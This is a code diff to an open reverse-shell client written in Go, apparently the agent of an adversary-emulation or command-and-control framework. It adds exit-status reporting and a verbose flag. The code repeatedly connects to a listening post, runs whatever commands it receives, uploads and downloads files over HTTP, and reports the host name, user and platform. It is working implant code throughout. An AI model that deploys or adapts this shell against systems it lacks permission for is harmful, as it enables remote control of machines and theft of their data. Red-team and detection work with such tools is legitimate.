@@ -12,7 +12,9 @@ import (
    "runtime"
    "time"
    "flag"
+   "strconv"
 
+   "./output"
    "./commands"
 )
 
@@ -51,31 +53,33 @@ func checkIfExecutorAvailable(executor string) bool {
 	return err == nil
 }
 
-func runNextCommand(message string) []byte {
+func runNextCommand(message string) ([]byte, int) {
    if strings.HasPrefix(message, "cd") {
       pieces := strings.Split(message, "cd")
       bites := commands.ChangeDirectory(pieces[1])
-      return bites
+      return bites, 0
    } else if (strings.HasPrefix(message, "download")) {
       pieces := strings.Split(message, "download")
       go commands.Download(httpServer, pieces[1])
-      return []byte("Download initiated\n")
+      return []byte("Download initiated\n"), 0
    } else if (strings.HasPrefix(message, "upload")) {
       pieces := strings.Split(message, "upload")
       go commands.Upload(httpServer, pieces[1], shellInfo)
-      return []byte("Upload initiated\n")
+      return []byte("Upload initiated\n"), 0
    } else {
-      bites := commands.Execute(message)
-      return bites
+      bites, status := commands.Execute(message)
+      return bites, status
    }
 }
 
 func listen(conn net.Conn, paw []byte) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
-       message := scanner.Text()
-       bites := runNextCommand(strings.TrimSpace(message))
-       conn.Write(append(paw, bites...))
+        message := scanner.Text()
+        bites, status := runNextCommand(strings.TrimSpace(message))
+        statusBites := []byte(fmt.Sprintf("%s$", strconv.Itoa(status)))
+        response := append(paw, statusBites...)
+        conn.Write(append(response, bites...))
     }
 }
 
@@ -99,18 +103,21 @@ func main() {
    executors := determineExecutor(platform, architecture)
    shellInfo = fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)
 
+   verbose := flag.Bool("v", false, "Enable verbose output")
    tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
    http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
    flag.Parse()
    httpServer = *http
 
+   output.SetVerbose(*verbose)
+
    for {
       conn, err := net.Dial("tcp", *tcp)
       if err != nil {
-         fmt.Println(err)
+         fmt.Println(fmt.Sprintf("[-] %s", err))
       } else {
           paw = handshake(conn)
-          fmt.Println(fmt.Sprintf("reverse-shell established for %s", paw))
+          fmt.Println(fmt.Sprintf("[+] reverse-shell established for %s", paw))
           listen(conn, []byte(fmt.Sprintf("%s$", paw)))
       }
       time.Sleep(5 * time.Second)
